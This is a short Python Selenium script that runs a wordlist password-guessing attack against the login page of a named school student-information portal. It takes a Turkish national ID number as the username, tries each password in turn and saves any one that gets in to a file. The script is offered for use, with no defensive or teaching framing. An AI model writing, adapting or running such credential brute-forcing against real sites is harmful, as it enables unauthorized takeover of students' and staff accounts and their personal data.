from selenium import webdriver
import time

username = input("TC : ")
wordlist = input("Wordlist Path : ")



browser = webdriver.Firefox()

url = "http://obs.finalokullari.com.tr/"

browser.get(url)
time.sleep(2)

usr_username = browser.find_element_by_xpath('//*[@id="username"]')
usr_password = browser.find_element_by_xpath('//*[@id="password"]')
usr_giris    = browser.find_element_by_xpath('/html/body/div[2]/div[1]/section/div/div/div[2]/div/div[2]/div/div[1]/div[2]/form/div[4]/button')


with open(wordlist,"r",encoding="UTF-8") as wlist:
	while True:
		for word in wlist :
			try:
				usr_username.clear()
				usr_password.clear()

				usr_username.send_keys(username)
				usr_password.send_keys(word)
				
				
				usr_giris.click()
				
				time.sleep(1)
			except:
				print("Easyy !!")
				with open("script.txt","w",encoding="UTF-8") as script:
					script.write(str("TC : ") + str(username) + str("\n") +  str("Şifre : ") + str(word))
			

